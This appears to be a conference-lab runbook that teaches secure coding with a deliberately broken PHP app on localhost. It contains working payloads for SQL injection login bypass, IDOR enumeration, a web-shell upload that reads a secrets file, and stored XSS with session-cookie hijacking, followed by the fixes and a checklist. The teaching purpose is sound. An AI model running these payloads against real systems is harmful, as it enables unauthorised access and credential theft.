# Presentation runbook — Code it. Break it. Secure it.

This is the live-demo plan for the DevFest lab. It assumes a 45–60 minute slot
and a projector. The application is intentionally simple; the point is the
conversation around each bug and its fix, not the amount of code.

## Before the room

```bash
make reset        # clean database, fresh containers
make test         # expect: 25 passed, 0 failed
```

- Open <http://localhost:8080> in a normal browser profile and sign in as
  `alice` / `Password123!`.
- Open <http://localhost:8081> in a second profile or an incognito window.
- Keep a terminal open in the repository root for the curl fallbacks.
- Keep `docs/ATTACKS.md` open on a second screen or phone.
- If you will show logs: `make logs` in another terminal.

Optional: copy the upload payload to a `.jpg` name for the browser demo:

```bash
cp payloads/shell.php /tmp/shell.php.jpg
```

## Run of show

### 0–5 min — Hook and disclaimer

- “Every feature in this app exists in a normal product: login, profiles,
  avatars, feedback.”
- “The app on 8080 is broken on purpose. The app on 8081 is the same product
  with the four bugs fixed.”
- “Do not deploy the 8080 build. It is a teaching artifact.”
- Show the feature map:

| Feature | Route |
| --- | --- |
| Register / login | `/register.php`, `/index.php` |
| Dashboard | `/dashboard.php` |
| Profile + avatar | `/profile.php?id=...`, `/upload.php` |
| Feedback wall | `/feedback.php` |
| Admin console | `/admin.php` |

### 5–12 min — Code it

Show the four vulnerable lines, in this order. Do not explain the exploit yet;
just show how ordinary the code looks.

1. **Login** — `vuln/src/index.php`: the SQL query is a string containing
   `$username` and `$password`.
2. **Profile** — `vuln/src/profile.php`: `$_GET['id']` goes straight into the
   user lookup.
3. **Upload** — `vuln/src/upload.php`: `pathinfo(..., PATHINFO_EXTENSION)` is
   the only gate, and the original filename is kept.
4. **Feedback** — `vuln/src/feedback.php`: the message is echoed raw.

Message to the room: “None of these look exotic. That is the point. Most real
bugs are ordinary code making an unreasonable assumption about input.”

### 12–32 min — Break it

#### Demo 1 — SQL injection (5 min)

1. On <http://localhost:8080/index.php>, enter:
   - Username: `admin' -- -`
   - Password: `anything`
2. Submit. The dashboard greets you as **Platform Admin**.
3. Open **Admin** in the navigation. The admin console and the user table are
   visible; access is the proof.

Alternative payload: `' OR 1=1 -- -`.

Talking points:

- The query becomes
  `SELECT ... WHERE username = 'admin' -- -' AND password = '...' LIMIT 1`.
- `-- ` starts a SQL comment, so the password condition is discarded.
- The app never checked the password; it only checked whether a row came back.
- This is authentication bypass and privilege escalation in one step.

Fallback:

```bash
curl -i -c /tmp/v.jar \
  --data-urlencode "username=admin' -- -" \
  --data-urlencode "password=wrong" \
  http://localhost:8080/index.php
curl -b /tmp/v.jar http://localhost:8080/admin.php
```

#### Demo 2 — IDOR (5 min)

1. Sign in as `alice` / `Password123!` on 8080.
2. Open **My profile**. The URL ends in `profile.php?id=2`.
3. Change the id to `3` (Bob). Bob's private note contains a private backup
   email and phone number - exactly the kind of data an IDOR should not expose.
4. Try `1` (admin) and `4` (Carol) to show that the whole table is reachable.

Talking points:

- Authentication is not authorization.
- The server must answer “may *this* user read *this* object?”, not just
  “is there a session?”.
- Predictable object ids make the bug trivial to enumerate.
- Hiding the link in the UI is not a fix; the URL is still reachable.

Fallback:

```bash
curl -c /tmp/a.jar -d 'username=alice&password=Password123!' \
  http://localhost:8080/index.php -o /dev/null
curl -b /tmp/a.jar http://localhost:8080/profile.php?id=3
```

#### Demo 3 — File upload to RCE (6 min)

1. As Alice, open **My profile**.
2. Upload `/tmp/shell.php.jpg` (or use the curl command below). The extension
   filter sees `.jpg` and accepts it.
3. Visit:

   ```text
   http://localhost:8080/uploads/shell.php.jpg?cmd=id
   ```

   You should see `RCE_OK` and `uid=33(www-data)`.
4. Read the application secrets:

   ```text
   http://localhost:8080/uploads/shell.php.jpg?cmd=cat%20/srv/pulse/.env
   ```

   The file contains fake database credentials and a fake payment API key. It is
   there to make the impact of RCE concrete.

5. Optional: `?cmd=uname -a` or `?cmd=ls -la /` to show this is full command
   execution inside the container.

Talking points:

- The filter only looks at the final extension. It does not inspect content,
  reject null bytes explicitly, or consider double extensions.
- `shell.php.jpg` passes the `.jpg` check. The vulnerable Apache config maps a
  filename containing `.php` before the final extension to the PHP handler.
  That is a legacy/misconfigured-server pattern worth recognising.
- Null-byte (`shell.php%00.jpg`) was a real bypass on old PHP; modern PHP
  rejects null bytes. The lesson is not “memorise one bypass”, it is “a
  filename is not a security boundary”.
- A successful upload-to-RCE is usually game over: read files, pivot, persist.

Fallback:

```bash
curl -b /tmp/a.jar \
  -F 'avatar=@payloads/shell.php;filename=shell.php.jpg;type=image/jpeg' \
  http://localhost:8080/upload.php
curl 'http://localhost:8080/uploads/shell.php.jpg?cmd=id'
curl 'http://localhost:8080/uploads/shell.php.jpg?cmd=cat%20/srv/pulse/.env'
```

#### Demo 4 — Stored XSS (6 min)

1. As Alice on 8080, open **Feedback**.
2. Post:

   ```html
   <script>alert(document.cookie)</script>
   ```

3. In the Admin browser profile, open **Feedback**. The alert shows the
   `PULSE_SID` session cookie.
4. Open DevTools → Application → Cookies and show that the same value is the
   live session id. Copy it.
5. In a fresh incognito window, set the cookie to that value (DevTools console:
   `document.cookie = 'PULSE_SID=<value>; path=/'`), reload, and you are
   signed in as Admin.

Talking points:

- Stored XSS runs in every visitor's browser; the attacker does not need to
  target the victim directly.
- The vulnerable cookie has no `HttpOnly` attribute, so JavaScript can read it.
- A real payload would send the cookie to an attacker-controlled endpoint
  instead of showing an alert.
- The database is not a trust boundary. Data becomes dangerous when it is
  rendered into a page.

Fallback:

```bash
curl -b /tmp/a.jar \
  --data-urlencode 'message=<script>alert(document.cookie)</script>' \
  http://localhost:8080/feedback.php
curl -b /tmp/a.jar http://localhost:8080/feedback.php
```

### 32–42 min — Secure it

Switch to <http://localhost:8081> and use the same accounts.

Re-run the four attacks:

| Attack | What happens on 8081 |
| --- | --- |
| `admin' -- -` login | “Invalid username or password.” |
| `/profile.php?id=3` as Alice | `403 Not your profile` |
| Upload `shell.php.jpg` | Rejected; no file stored |
| Feedback `<script>...` | Displayed as inert text, not executed |

Then show the fixes:

**SQL injection**

```php
$stmt = db()->prepare('SELECT * FROM users WHERE username = ? LIMIT 1');
$stmt->execute([$username]);
$user = $stmt->fetch();

$valid = $user !== false && password_verify($password, (string) $user['password']);
```

**IDOR**

```php
$requestedId = isset($_GET['id']) ? (int) $_GET['id'] : (int) $me['id'];
$isOwner = $requestedId === (int) $me['id'];

if (!$isOwner && !is_admin($me)) {
    http_response_code(403);
    exit;
}
```

**Upload**

```php
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime  = $finfo->file((string) $file['tmp_name']);
$imageInfo = @getimagesize((string) $file['tmp_name']);

if (!is_string($mime) || !isset($allowed[$mime]) || $imageInfo === false) {
    // reject
}

$newName = bin2hex(random_bytes(16)) . '.' . $allowed[$mime];
```

Plus `uploads/.htaccess` with `php_flag engine off` and a deny rule for
executable extensions.

**Stored XSS**

```php
<p><?= e($item['message']) ?></p>
```

Plus the CSP header and the `HttpOnly` session cookie.

Also show the supporting fixes:

- CSRF tokens on every POST form.
- Session id regeneration on login.
- `password_hash()` / `password_verify()`.
- Generic error messages; details only in logs.
- Private notes hidden even from administrators.

Proof that the hardening works:

```bash
make test
# 25 passed, 0 failed
```

### 42–50 min — Practical secure coding checklist

Close with habits, not just payloads:

1. **Parameterise every query.** User input is data, never SQL syntax.
2. **Authorize every object access on the server.** Ask “may this user access
   this id?” before the lookup. Do not trust the UI.
3. **Treat uploads as hostile.** Validate real content (`finfo`,
   `getimagesize`), generate a new name and extension, enforce size limits,
   store outside the webroot or disable execution in the upload directory.
   Re-encoding images is even better.
4. **Encode on output, for the right context.** `htmlspecialchars()` for HTML,
   JSON encoding for JSON, parameterised queries for SQL. CSP is defence in
   depth, not a substitute.
5. **Hash passwords with a slow, salted algorithm.** `password_hash()` and
   `password_verify()`; add rate limiting and MFA where appropriate.
6. **Protect state-changing requests with CSRF tokens** and use
   `SameSite=Lax`/`Strict` cookies.
7. **Harden sessions.** Regenerate the id on login, set `HttpOnly`, `Secure`
   under HTTPS, and `session.use_strict_mode=1`.
8. **Fail safely.** Generic errors to users, detailed logs to the server.
   Never render stack traces or SQL errors.
9. **Apply least privilege.** An admin does not automatically need every
   user's private note. Roles are not a substitute for ownership checks.
10. **Keep secrets out of source.** Environment variables in the lab; a secret
    manager in production.
11. **Test the negative paths.** Add automated checks that the payloads in this
    lab are rejected. The smoke test in this repo is a small example.
12. **Keep dependencies and frameworks current.** Most of these bugs have
    well-known framework-level fixes; use them.

### 50–60 min — Q&A and challenges

If the room is quiet, ask:

- “Which of the four bugs would be easiest to miss in code review?”
- “Which one has the largest blast radius?”
- “What would you fix first if this were your production app?”
- “Where would a WAF have helped, and where would it not?”

Participant challenges (there are no flags; access to data or functionality is
the proof):

| Challenge | Goal |
| --- | --- |
| SQLi | Reach the admin console without the admin password |
| IDOR | Read Bob's private note as Alice |
| Upload | Execute `id` through the avatar upload |
| XSS | Read a session cookie in another user's browser |

## 20-minute lightning version

- 2 min: show the app and the feature map.
- 4 min: SQLi login bypass and access to the admin console.
- 3 min: IDOR in the profile URL.
- 4 min: upload `shell.php.jpg` and read `/srv/pulse/.env`.
- 3 min: stored XSS and the non-HttpOnly cookie.
- 4 min: secure build blocks all four; show the four code changes and the
  checklist.

## If something breaks on stage

- Run `./scripts/smoke-test.sh`; it exercises every path and prints a clear
  pass/fail list.
- If the database is in a strange state, `make reset` and wait for the health
  check.
- If the browser is fighting you, use the curl fallbacks from
  [ATTACKS.md](ATTACKS.md).
- If the upload does not execute, confirm the file was stored as
  `shell.php.jpg` (not `shell.php`) and that you are requesting the `.php.jpg`
  URL on port 8080.
- If the XSS alert does not appear, confirm the payload is in the page source
  and that you are viewing the feedback page on 8080, not 8081.
